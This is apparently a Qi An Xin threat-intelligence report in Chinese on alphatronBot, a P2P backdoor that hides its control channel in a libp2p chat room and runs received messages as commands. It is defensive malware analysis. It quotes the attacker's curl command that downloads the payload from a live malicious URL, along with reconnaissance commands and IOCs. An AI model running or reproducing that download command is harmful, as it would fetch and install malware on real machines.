---
title: 去中心化的噩梦：隐藏在 P2P 网络下的后门 alphatronBot
url: https://mp.weixin.qq.com/s?__biz=MzI2MDc2MDA4OA==&mid=2247513129&idx=1&sn=5723225dc5a665d7f8137559b2eafc8d&chksm=ea66435edd11ca48b6d30a603939eb42d123a80be5f1730777bfcdcd0d44052cc05b2d6676b3&scene=58&subscene=0#rd
source: 奇安信威胁情报中心
date: 2024-11-29
fetch_date: 2025-10-06T19:17:33.331456
---

# 去中心化的噩梦：隐藏在 P2P 网络下的后门 alphatronBot

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1o6q5KaibDuqMHNE11td6PPIreOUImr8qecicgs9UMibIMzvHPgV0g47jw/0?wx_fmt=jpeg)

# 去中心化的噩梦：隐藏在 P2P 网络下的后门 alphatronBot

原创

红雨滴团队

奇安信威胁情报中心

概述

奇安信威胁情报中心在最近的日常运营过程中观察到一款基于 P2P 协议的后门程序，通过 PubSub 聊天室的形式进行控制，后门内置了 700 多个受感染的 P2P C2节点，影响 linux 和 windows 双平台，国内大量政企中招，我们将其命名为 alphatronBot，拥有远控功能，并且会下发特定的 payload，经过溯源发现 alphatronBot 最早出现于 2023 年初，在 2024 年 4 月份初进行重构，目前已经观察到受感染的 P2P 节点被当作网络代理进行爆破活动。

我们建议政企客户在办公区和服务器区同时部署天擎EDR，最新版本的病毒库已经支持对新老版本 alphatronBot 的查杀。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1PeibTllDFOLqEcGw9GNGZPQWh9eKYL5WOqzzoF92NMFwnycIJ2knrpA/640?wx_fmt=png&from=appmsg)

alphatronBot

2024 年的 alphatronBot 一般作为第二阶段的载荷被攻击者通过 curl 命令远程下发,我们推测 alphatronBot 可能加入了 MAAS 分发机制，利用通用攻击面进行传播：

|  |
| --- |
| **Cmd命令** |
| **curl -k -o  "\*\*\*AppData\Local\Temp\NetFramework.4.8.7z" -L -C -  "https://z.yaridata.com/v/NetFramework.4.8.7z" --user-agent "\*\*\*\*"  --retry 3** |

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1U82euiahOBQLfu4k7iam584W5INp0tL4WJqxZZg7dhSDzzphdMGXSR8A/640?wx_fmt=png&from=appmsg)

Wtime.cmd 被添加为持久化，负责启动加载器 wuf.exe。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1jvnsCF1CKQfmiaSsxoQauk81JSeyib3Iy7VVECa8CNKSotRqaL51Sdvg/640?wx_fmt=png&from=appmsg)

Wuf.exe 的逻辑如下，启动名为 Windows Driver Foundation (WDF).exe 的 alphatronBot 后门程序。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F12xK2zJuUNjgNicUSctrjF1VpwxIkPfgy49KhtdXZ82ZBXUVic8HRDTjg/640?wx_fmt=png&from=appmsg)

2024 年重构后的 alphatronBot 由开源项目 manishmeganathan/peerchat 修改而来，通过 libp2p 实现的聊天室程序。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F18iaNpoW5csQXicQh2SrcTJr7GCE0hRRTmIuep29qvpRLZXuQ0jQbrxNA/640?wx_fmt=png&from=appmsg)

攻击者在此基础上进行了修改：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1hKqJ9ffxiaPkichYwpUl1IOhUmgicbckhdwoqicEZlcxy4GkBR8ub7K7WA/640?wx_fmt=png&from=appmsg)

启动时会检测自身是否在 C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\ 目录下，并且该目录下是否存在 r01.txt

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1OdpOz4ibul7lARKseic0XKGQ3SOfOKmGGQTCg56S6qHZ0sUkFzs0mIyg/640?wx_fmt=png&from=appmsg)

将自己注册为 P2P 的节点，并将节点配置信息储存在同目录下的 zk.txt 和 zi.txt 中。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1jorPBEJvO177UjP4dcAv6GCXHiaYIwDMGxRnry0XMiaePh8031sJkYAA/640?wx_fmt=png&from=appmsg)

攻击者内置了 700 多个 P2P 节点。格式如下：

|  |
| --- |
| **/ip4/****受感染的****p2p****节点****/tcp/48888/p2p/Peer  ID** |

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1kxr73smUnIDZ97jFMDicPriba8viaEjIxzwoJJmGt8uicf3Ll9ZMvs5cLw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1ZXw9UYxNCtetSQqVcUS3XJZcO58ZBX8uib5IkysAZZFJGZKI8P1jvLg/640?wx_fmt=png&from=appmsg)

该项目节点间的通信由 PubSub 方式实现，所有节点连接到一个共同的 Topic(roomname)，由该 Topic 的发送者来实现消息分发，项目中内置的默认 Topic 如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1Wic87K5aakrYKlW2fRKTwGLZsYrWkg6yib8ahuUnWjQp6tkzw0KsfNUQ/640?wx_fmt=png&from=appmsg)

攻击者修改了 Topic 前缀为 at001，并替换了 roomname。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1wqJXDDpJ10xsKPP2uYvVx2Oz67SUvotC58oGJ9wH8YtRdsNssux0Ag/640?wx_fmt=png&from=appmsg)

连接到 Topic 后将 username 设置为 Alpha。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1WL4kWzGzrTZAyDMiaA4lZHPGiaxJVicYyD7Biaa9rWUiclDLkcYQqqSaexg/640?wx_fmt=png&from=appmsg)

最后修改了该项目的 UI 逻辑，将接收到消息后的打印函数 display.chatmessage 改为执行 CMD 命令从而实现远控功能

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1r1nEeQx85eEMtfcZ2RPbNwvbvPNdWuOysicajQW52vQZu2uGJGZpBHQ/640?wx_fmt=png&from=appmsg)

修改后的 display.chatmessage 会将接收到的消息写入 temp 文件夹下的 zc01.cmd。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F11ej155j3RaHyqdBJBJ16xS6K0xFtlkdjCW7M6FppkLVXhgD5QGflmg/640?wx_fmt=png&from=appmsg)

最后通过 cmd 执行 zc01.cmd。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1nkeNwtqKxaFyjWQiaxqgdibZ6S2VaKa959M6wDZknQ2HYsExcrEcfkLg/640?wx_fmt=png&from=appmsg)

溯源分析

基于终端数据，我们找到了 2023 年版本的 alphatronBot（d038f50779fc1ae97db5b40289a38d64），由 Qt 库编写，功能与 2024 年的类似，从 VT 的上传数据可以推测 alphatronBot 的影响范围遍及全球。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1R2zM2kOia7UBkU7SPTxiaGLbPcicFyxCF5wWbrKmvmKIvEk7wMtYr3icUg/640?wx_fmt=png&from=appmsg)

后门连接到 P2P 分布式网络后会接收如下命令进行探测和检查。

|  |
| --- |
| **Cmd****命令** |
| **tasklist** |
| **WMIC  DISKDRIVE GET SERIALNUMBER** |

攻击者可以在下发的 cmd 中对本地储存的 Peer ID 进行判断从而实现对不同目标下发定制化的 payload。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1mf6tiav7F6kqv9on6M9GUJCRGt0rEV44NefmibAHIqVJ9iblqwMzOJRCQ/640?wx_fmt=png&from=appmsg)

影响情况

**受感染的P2P网络**

后门内置的 700 余个 p2p 网络由 80 个国家和地区受感染的网络设备组件组成：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1IqicP7TBtRqSBR8tiaPYrJ8aKx8cGt1VAicNmdeFyaTkgFBWaCazBIaxQ/640?wx_fmt=png&from=appmsg)

节点涉及 MikroTik 路由器、Hikvision 摄像头、VPS 服务器、DLink 路由器、CPE 设备等，由于 alphatronBot 会将自身终端注册成 P2P 节点，所以该 P2P 网络的规模要远比目前观察的规模大，基于奇安信全球僵尸网络检测系统观测到部分 P2P 节点对应的 IP开始被当作代理对 Fortinet SSVPN 进行爆破活动。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1XuX69ZNXZDpYEN5xypFXLaicYffm8jr8jeuSN4iaIsa2J5lfjpPcF97Q/640?wx_fmt=png&from=appmsg)

**国内影响范围**

我们统计了国内的影响情况，从 2023 年中出现一直持续至今。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1BsoACAAeQBxiaNol31wiazSuHJHZzJXGqiaiaHRglq49fo77WgoGRHruWA/640?wx_fmt=png&from=appmsg)

受害者单位所属行业占比如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F16ScFKSiaHSer3Sic0dLlwBVOajwicces6VamuQ3BpiawTqroNOsEanc9ibw/640?wx_fmt=png&from=appmsg)

由于 P2P 协议的隐蔽性，攻击者可以通过任意节点下发指令，无需通过单一 C&C 服务器。这意味着即便部分节点被安全团队清理，其他节点仍可保持木马的运行。攻击者可以借助分布式更新功能，随时注入新的模块或修复漏洞，进一步增强木马的生存能力。我们建议政企客户及时更新病毒库，并全盘扫描，流量层面查询我们提供的 P2P C2 节点以保证系统的安全。

总结

目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1txe1dY7pibEspGNEV53Bpqff1sk9icZDUZGqd1ibdbcsy5pNuXMgNcia4A/640?wx_fmt=png&from=appmsg)

IOC

P2P C2网络（见GitHub 链接）：

https://github.com/RedDrip7/APT\_Digital\_Weapon/blob/master/alphatronBot/alphatronBot\_ioc.md

ITW URL：

https://z.yaridata.com/v/NetFramework.4.8.7z

MD5：

e1e9a32926ebdbcedaf693dbc43b0e4d（2024年alphatronBot）

57cc9374d78d5e9841fddfd3cc7bd609（2024年alphatronBot）

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/2AqAgxkehic9xdA9ymxFSlBRAlBibeg9F1Gia71PickvWORQU6JYh6EodzibopOYqgeTRTx0cJMs8mbzSQgDibUySy0w/640?wx_fmt=gif&from=appmsg)

点击阅读原文至**ALPHA 7.0**

即刻助力威胁研判

预览时标签不可点

阅读原文

修改于

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/2AqAgxkehic9reynyobeEoOxwxOBrYrdjpuwE9eRaLTgBEVEuichLmtKsGusaxticjIQZGPZhCtODWekJxj0Zqscw/0?wx_fmt=png)

奇安信威胁情报中心

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/2AqAgxkehic9reynyobeEoOxwxOBrYrdjpuwE9eRaLTgBEVEuichLmtKsGusaxticjIQZGPZhCtODWekJxj0Zqscw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过